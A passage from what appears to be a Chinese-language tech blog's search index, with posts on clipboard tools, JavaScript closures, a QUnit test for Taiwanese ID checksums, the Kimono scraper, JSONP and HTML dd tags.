Text還hold的住<br>現在就有點麻煩，速度感覺有變慢<br>就想以前有看到剪貼簿工具<br>但覺得用不太到…<br>現在發現還滿好用的</p>\n<a id=\"more\"></a>\n<p>目前有試用Ditto、HamsinClipboard</p>\n<p>Ditto是免費開源軟體<br>Ctrl+` 可呼叫清單<br>沒有次數限制</p>\n<p>*但沒有強力貼上功能</p>\n<p>HamsinClipboard<br>比較喜歡他的Incremental paste<br>就是可以複製 → 複製→複製→複製→複製 → 貼上→貼上 → 貼上→ 貼上→ 貼上</p>\n<p>可惜…有十個限制<br>但還是能加減用XD</p>\n<p>ClipX好像win7 64bit換閃退<br>ClipMate 聽說這邊更強…<br>但他並非免費軟體，這邊我就不介紹了<br>他的順序粘貼（Incremental paste）真的是最簡單又好用</p>\n<p>Firefox Easy Copy<br>大量開分頁複製Tittle和URL需要大量時間<br>所以每次隨意筆記都要花一堆時間</p>\n<p>現在Easy Copy 套件能解決我的問題<br>但好像沒辦法做到換行…<br>沒關係，Sublime Text hold的住XD</p>\n<hr>\n<p>參考來源</p>\n<p>剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） | 善用佳软<br><a href=\"https://xbeta.info/clipx-clcl-ditto.htm\" target=\"_blank\" rel=\"noopener\">https://xbeta.info/clipx-clcl-ditto.htm</a></p>\n<p><strong>2020-01-31</strong><br><a href=\"https://xbeta.info/clipx-clcl-ditto.htm\" target=\"_blank\" rel=\"noopener\">剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） – 善用佳软</a></p>\n<p>最近想找美費能做順序粘貼（Incremental paste）<br>有看到幾個介紹使用測試</p>\n<p>Clipboard Magic 找不到這個功能(說不定是我沒找到)<br>不知道是不是 Win 7 關係不太相容，所以程式用起來非常卡</p>\n<p><a href=\"https://chocolatey.org/packages/clipjump\" target=\"_blank\" rel=\"noopener\">Chocolatey Software | Clipjump 12.5</a><br>後來看到下面的人推薦使用 Clipjump<br>雖然沒有找到類似 clipmate 順序粘貼<br>但發現連續 Ctrl + C ，再<strong>貼上的時候 Ctrl+ V 時候，放掉V後Ctrl不要放掉再按V</strong><br>這時候會有跳出提示是什麼字<br>這時候會發現只能下一步<br>貼錯要回去怎麼辦??<br><code>V改成C</code>會往前貼之前的東西<br>這個就有類似順序粘貼功能</p>\n<p>其實功能還滿多的，但缺乏 GUI 介面<br>所以可能第一次要摸了老半天才知道要怎麼用</p>\n","categories":["實用工具"]},{"title":"[JavaScript]閉包筆記記錄","url":"/blog/2016/10/02/logdown/2016-10-02-javascript-closure-note/","content":"<p>之前看JavaScript閉包文章都看不懂，前陣子買了FB社群推薦的「忍者JavaScript開發技巧探秘」<br>最近先跳著看到閉包單元，有了解一點東西跟以前錯誤的觀念，就先來這邊做一下筆記。<br>免得之後全部忘光光了XD</p>\n<a id=\"more\"></a>\n<p>首先，前面介紹每個function都是閉包(我驚呆了)<br>我這邊就先舉例範例<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> value = <span class=\"string\">'hello world'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(value)  <span class=\"comment\">// print hello world</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>相信大家都知道這一定會顯示hello world吧<br>但我覺得大家都會不太清楚這是閉包<br>以下是我記錯當時錯誤觀念</p>\n<blockquote>\n<p>前陣子，跟同事討論這個問題，他認為JavaScript在function外面就是全域變數<br>所以值也會抓到。<br>我認為是因為當function沒有宣告變數，會自動抓取window.value<br>不過跟我同事一樣，也是全域變數觀念。</p>\n</blockquote>\n<p>以前有看到在瀏覽器沒有下var變數，變數會寫在window物件上<br>我以為同理可證跟function一模一樣，但測試結果也是這樣</p>\n<p>以前，看JavaScript大全完全看不懂閉包這單元<br>今天終於開竅了。</p>\n<p><strong>簡單來講閉包就是function抓取變數，先從function內抓取變數，假如function內沒變數，會從外面抓取變數</strong><br>他有著call by reference觀念<br>詳細：<a href=\"http://eddychang.me/blog/javascript/84-js-clousure.html\" target=\"_blank\" rel=\"noopener\">http://eddychang.me/blog/javascript/84-js-clousure.html</a><br>上面網站圖片和內容寫得還滿清楚的</p>\n<p>好了，再來進入番外篇<br>JavaScript怎麼會有call by reference<br>我一直以為JavaScript都是call by value<br>好險，看到上面這個文章<br>JavaScript有一個形態是call by reference<br>就是Object物件就是call by reference</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var obj = &#123;a:1&#125;</span><br><span class=\"line\">function a(value)&#123;</span><br><span class=\"line\">    value.a=3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">a(obj);</span><br><span class=\"line\">console.log(obj);   // print Object  &#123;a:3&#125;</span><br></pre></td></tr></table></figure>\n<p>以前好在沒有採到這個雷，下次應該不會踩到XD</p>\n<p>然後，接下來突然想到以前看不懂的閉包<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake\" target=\"_blank\" rel=\"noopener\">文章</a><br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">id</span>=<span class=\"string\">\"help\"</span>&gt;</span>Helpful notes will appear here<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>E-mail: <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"email\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"email\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Name: <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Age: <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"age\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"age\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">showHelp</span>(<span class=\"params\">help</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'help'</span>).innerHTML = help;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setupHelp</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> helpText = [</span><br><span class=\"line\">      &#123;<span class=\"string\">'id'</span>: <span class=\"string\">'email'</span>, <span class=\"string\">'help'</span>: <span class=\"string\">'Your e-mail address'</span>&#125;,</span><br><span class=\"line\">      &#123;<span class=\"string\">'id'</span>: <span class=\"string\">'name'</span>, <span class=\"string\">'help'</span>: <span class=\"string\">'Your full name'</span>&#125;,</span><br><span class=\"line\">      &#123;<span class=\"string\">'id'</span>: <span class=\"string\">'age'</span>, <span class=\"string\">'help'</span>: <span class=\"string\">'Your age (you must be over 16)'</span>&#125;</span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> item = helpText[i];</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(item.id).onfocus = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      showHelp(item.help);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">setupHelp();</span><br></pre></td></tr></table></figure>\n<p>這下能理解item.help為什麼抓到都是helpText最後面一個<br>因為每個迴圈實做閉包<br>但是setupHelp()跑完item變數就會存在於閉包，不會消失(但外在function沒法存取這個變數)<br>所以每個onfocus都會跑出<code>Your age (you must be over 16</code><br>了解過去不了解的東西，可喜可賀^o^</p>\n<p>再來，番外篇2<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake\" target=\"_blank\" rel=\"noopener\">文章</a>上面有寫let可以解決閉包範例<br>所以就爬文一下</p>\n<blockquote>\n<p><code>let</code>好像類似Java變數生活周期是在{}結束</p>\n</blockquote>\n<p><em>上述只是猜測</em><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(a==<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">   <span class=\"keyword\">let</span> a = <span class=\"number\">1</span></span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(a);  <span class=\"comment\">// print 1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> <span class=\"built_in\">console</span>.log(a);  <span class=\"comment\">// print 2</span></span><br></pre></td></tr></table></figure></p>\n<p>有空深入了解</p>\n<p>聽說閉包是JavaScript精華，目前提到的東西可能還算閉包最基礎的東西<br>像scope chain、匿名函式……都還沒研究。<br>等了解後再記錄筆記吧</p>\n<p>參考：<br>《你不知道的JavaScript》整理（一）——作用域、提升與閉包 - 每日頭條<br><a href=\"https://kknews.cc/other/6bmzqq.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/other/6bmzqq.html</a><br>闭包 - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake</a><br>Javascript 閉包 Closure « Guang’s Note<br><a href=\"http://guang.logdown.com/posts/277383-javascript-closure\" target=\"_blank\" rel=\"noopener\">http://guang.logdown.com/posts/277383-javascript-closure</a><br>JavaScript筆記: function is call by “value” or call by “reference”? « 弱弱前端碎碎念<br><a href=\"http://heyyou.logdown.com/posts/145054\" target=\"_blank\" rel=\"noopener\">http://heyyou.logdown.com/posts/145054</a><br>Tag : javascript « 弱弱前端碎碎念<br><a href=\"http://heyyou.logdown.com/tags/javascript\" target=\"_blank\" rel=\"noopener\">http://heyyou.logdown.com/tags/javascript</a><br>從ES6開始的JavaScript學習生活 · GitBook<br><a href=\"https://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details</a><br>refer<br><a href=\"http://eddychang.me/blog/javascript/84-js-clousure.html\" target=\"_blank\" rel=\"noopener\">http://eddychang.me/blog/javascript/84-js-clousure.html</a><br>深入理解什麼是javascript中的閉包。<em>StackDoc<br><a href=\"http://fanli7.net/a/caozuoxitong/OS/20110830/125313.html\" target=\"_blank\" rel=\"noopener\">http://fanli7.net/a/caozuoxitong/OS/20110830/125313.html</a><br>let<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/let#let\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/let#let</a></em>%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8D%80%E5%A1%8A</p>\n","categories":["JavaScript"],"tags":["閉包","JavaScript","reference"]},{"title":"用Qunit驗證身份證","url":"/blog/2016/12/02/logdown/2016-12-02-1163133/","content":"<p>最近copy到公司身份證驗證程式有問題<br>好險是上線前發現<br>今天就簡單用測試程式寫了QUNIT測試程式</p>\n<a id=\"more\"></a>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://code.jquery.com/qunit/qunit-git.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://code.jquery.com/qunit/qunit-git.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Bin<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"qunit\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"qunit-fixture\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">QUnit.module(<span class=\"string\">'測試身份證'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getTwID</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//建立字母分數陣列(A~Z)</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> city = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(</span></span><br><span class=\"line\"><span class=\"undefined\">         1,10,19,28,37,46,55,64,39,73,82, 2,11,</span></span><br><span class=\"line\"><span class=\"undefined\">        20,48,29,38,47,56,65,74,83,21, 3,12,30</span></span><br><span class=\"line\"><span class=\"undefined\">    )</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//建立隨機身份證碼</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> id = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"javascript\">    id[<span class=\"number\">0</span>] = <span class=\"built_in\">String</span>.fromCharCode(<span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * (<span class=\"number\">26</span>)) + <span class=\"number\">65</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    id[<span class=\"number\">1</span>] = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * (<span class=\"number\">2</span>)) + <span class=\"number\">1</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">2</span>; i&lt;<span class=\"number\">9</span>; i++)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        id[i] = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * (<span class=\"number\">9</span>)) + <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//計算總分</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> total = city[id[<span class=\"number\">0</span>].charCodeAt(<span class=\"number\">0</span>)<span class=\"number\">-65</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">8</span>; i++)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        total += <span class=\"built_in\">eval</span>(id[i]) * (<span class=\"number\">9</span> - i);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//計算最尾碼</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> total_arr = (total+<span class=\"string\">''</span>).split(<span class=\"string\">''</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> lastChar = <span class=\"built_in\">eval</span>(<span class=\"number\">10</span>-total_arr[total_arr.length<span class=\"number\">-1</span>]);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> lastChar_arr = (lastChar+<span class=\"string\">''</span>).split(<span class=\"string\">''</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//補上最後檢查碼</span></span></span><br><span class=\"line\"><span class=\"undefined\">    id[id.length++] = lastChar_arr[lastChar_arr.length-1];</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//回傳結果</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">return</span> id.join(<span class=\"string\">''</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkTwID</span>(<span class=\"params\">id</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">//建立字母分數陣列(A~Z)</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> city = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(</span></span><br><span class=\"line\"><span class=\"undefined\">         1,10,19,28,37,46,55,64,39,73,82, 2,11,</span></span><br><span class=\"line\"><span class=\"undefined\">        20,48,29,38,47,56,65,74,83,21, 3,12,30</span></span><br><span class=\"line\"><span class=\"undefined\">    )</span></span><br><span class=\"line\"><span class=\"undefined\">    id = id.toUpperCase();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 使用「正規表達式」檢驗格式</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span> (id.search(<span class=\"regexp\">/^[A-Z](1|2)\\d&#123;8&#125;$/i</span>) == <span class=\"number\">-1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        alert(<span class=\"string\">'基本格式錯誤'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">//將字串分割為陣列(IE必需這麼做才不會出錯)</span></span></span><br><span class=\"line\"><span class=\"javascript\">        id = id.split(<span class=\"string\">''</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">//計算總分</span></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> total = city[id[<span class=\"number\">0</span>].charCodeAt(<span class=\"number\">0</span>)<span class=\"number\">-65</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">8</span>; i++)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            total += <span class=\"built_in\">eval</span>(id[i]) * (<span class=\"number\">9</span> - i);</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">//補上檢查碼(最後一碼)</span></span></span><br><span class=\"line\"><span class=\"javascript\">        total += <span class=\"built_in\">eval</span>(id[<span class=\"number\">9</span>]);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">//檢查比對碼(餘數應為0);</span></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> ((total%<span class=\"number\">10</span> == <span class=\"number\">0</span> ));</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">var</span> chartId_list = [];</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>;i++)&#123;</span></span><br><span class=\"line\"><span class=\"undefined\">  chartId_list.push(getTwID());</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//遇到動態產生錯誤問題，解決方法</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//http://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  QUnit.test( <span class=\"string\">\"驗證ID:\"</span> + chartId_list[i], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> assert </span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    assert.ok( checkTwID(chartId_list[i]), <span class=\"string\">\" 網路方法 Passed!\"</span> );</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>#備忘錄<br>之前動態產生測試會有問題<br>有想用閉包解決，但沒有想到怎麼用  x.x<br>最後還是靠stackoverflow查到<br>果然我還需要磨練阿~~~~</p>\n","categories":["JavaScript"],"tags":["test","Qunit"]},{"title":"不用程式寫爬蟲記錄(Kimono Desktop)","url":"/blog/2016/11/27/logdown/2016-11-27-1147900/","content":"<p>前幾天看到<a href=\"http://blog.infographics.tw/2016/11/google-spreadsheet-data-scraping/\" target=\"_blank\" rel=\"noopener\">無痛爬梳自己來，用 Google Spreadsheet 爬取網頁資料</a><br>就想之前的Kimono<br>但現在官網要收掉這個服務<br>不過有官網友留下kimono desktop edition 離線版程式使用(只有MAC和Windows)<br>目前不知道有沒有辦法移植到Linux上面玩</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th>kimonolabs.com</th>\n<th>kimono for desktop</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Create APIs with Chrome Ext</td>\n<td>v</td>\n<td></td>\n</tr>\n<tr>\n<td>Create APIs with Bookmarklet</td>\n<td>v</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Manage and configure APIs</td>\n<td>v</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Run APIs manually</td>\n<td>v</td>\n<td></td>\n</tr>\n<tr>\n<td>Run APIs on a schedule</td>\n<td>v</td>\n<td></td>\n</tr>\n<tr>\n<td>Cloud hosted API endpoints</td>\n<td></td>\n<td>v (w/ Firebase)</td>\n</tr>\n<tr>\n<td>Crawling &amp; Pagination</td>\n<td>v</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Get data behind a login</td>\n<td>v</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Kimono Apps / Blocks</td>\n<td>v</td>\n<td></td>\n</tr>\n<tr>\n<td>Google sheets integration</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Webhooks &amp; Email alerts</td>\n<td>v</td>\n</tr>\n<tr>\n<td>Save scraped data to file</td>\n<td>v</td>\n<td>v</td>\n</tr>\n<tr>\n<td>CSV &amp; RSS output</td>\n<td>v</td>\n<td>v</td>\n</tr>\n</tbody>\n</table>\n<p>當然離線版沒有這麼多功能，可惜沒有排程可以用<br>但發現他程式透過NodeJS去寫，好像可以透過API方式去實作<br>在此先記錄一下筆記</p>\n<a id=\"more\"></a>\n<p>首先，安裝kimono desktop edition 和chrome extension<br>相關套件網路就一堆，我就先偷懶拉o.&lt;<br><a href=\"http://blog.infographics.tw/2015/04/crawl-data-without-code-using-kimonolabs/\" target=\"_blank\" rel=\"noopener\">不會寫程式也能爬，Kimono 幫你把網站變資料</a></p>\n<p>API建立好，開kimono desktop edition可以看到剛剛家加入的任務<br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1147900/4xl8wny7RwWp7WYxUY9l_k1.png\" alt=\"k1.png\"></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1147900/hJk274dUQWevRRnnZ50e_k2.png\" alt=\"k2.png\"></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1147900/yIHnKB00Ta6ZkdISSZ7V_k3.png\" alt=\"k3.png\"><br>按下Start Crawl 可執行爬蟲</p>\n<p>後來我發現kimono desktop edition可以開啟開發者工具<br>發現執行Web API可以跑爬蟲<br>看來排程執行爬蟲指日可待XD</p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1147900/0oIV98RT9K5ZIULkibM3_k4.png\" alt=\"k4.png\"><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /ws/startcrawl/ HTTP/1.1</span><br><span class=\"line\">Host: localhost:3000</span><br><span class=\"line\">Origin: http://localhost:3000</span><br><span class=\"line\">X-DevTools-Emulate-Network-Conditions-Client-Id: 93A1E1D6-2642-4DD4-84B2-5BAE0E75261C</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) kimono-desktop/1.0.5 Chrome/45.0.2454.85 Electron/0.35.4 Safari/537.36</span><br><span class=\"line\">Content-Type: application/json;charset=UTF-8</span><br><span class=\"line\">Referer: http://localhost:3000/apis/b8ed4oy2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-TW</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Postman-Token: 0b770020-6467-cff2-5923-6300dc330def</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;apiid&quot;:&quot;b8ed4oy2&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1147900/lHJfAnWyQ2C8wbHncI7t_k5.png\" alt=\"k5.png\"></p>\n<p>看爬蟲API任務的狀態WEB API</p>\n","categories":["實用工具"],"tags":["爬蟲","Kimono"]},{"title":"[JavaScript]JSONP為什麼不能用POST","url":"/blog/2016/12/26/logdown/2016-12-26-1246428/","content":"<p>為什麼JSONP不能使用POST?<br>因為JSONP透過script標籤實作<br>所以才沒辦法做<br><a id=\"more\"></a></p>\n<p>就這樣:)</p>\n<p>參考來源:<br>How to use type: “POST” in jsonp ajax call<br><a href=\"http://stackoverflow.com/questions/4508198/how-to-use-type-post-in-jsonp-ajax-call\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/4508198/how-to-use-type-post-in-jsonp-ajax-call</a><br>使用 JSONP 跨站請求<br><a href=\"http://openhome.cc/Gossip/JavaScript/JSONP.html\" target=\"_blank\" rel=\"noopener\">http://openhome.cc/Gossip/JavaScript/JSONP.html</a></p>\n","categories":["JavaScript"],"tags":["JavaScript","JSONP"]},{"title":"[HTML]dd 裡面不能故放入dd標籤","url":"/blog/2017/02/23/logdown/2017-02-23-1458104/","content":"<p>dd裡面不能放入dd標籤<br>用了一整天的畫面問題<br>在找漏掉結尾的html tag<br>結果…採到這個雷 囧</p>\n","categories":["HTML"],"tags":["HTML","dd"]},{"title":"[JavaScript] JSONP 